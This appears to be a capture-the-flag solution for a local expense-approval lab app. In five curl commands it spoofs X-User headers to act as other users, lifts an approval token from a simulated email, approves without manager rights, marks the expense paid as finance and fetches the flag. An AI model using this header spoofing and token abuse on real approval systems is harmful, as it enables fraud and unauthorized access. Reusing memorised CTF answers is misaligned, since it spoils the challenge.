# 1) Submit an expense as alice (X-User: 1)

```bash
curl -i -H "X-User: 1" -H "Content-Type: application/json" \
  -d '{"amount":100,"description":"expense"}' \
  http://localhost:3000/expenses
```

# 2) Read the simulated email (get approval token)

```bash
curl -i -H "X-User: 1" http://localhost:3000/emails/last
# → Look for "body": ".../approve?token=<TOKEN>" and copy the token value.
```

# 3) Approve using the token (server does not require you to be the manager)

# Replace <TOKEN> with the copied token

```bash
curl -i "http://localhost:3000/approve?token=<TOKEN>"
```

# 4) Mark the approved expense as paid (act as finance X-User: 3)

# Replace 4 with the actual approved expense id if different

```bash
curl -i -X POST -H "X-User: 3" http://localhost:3000/pay/4
```

# 5) Fetch the flag (any user can read once paid)

```bash
curl -i -H "X-User: 1" http://localhost:3000/flag
```
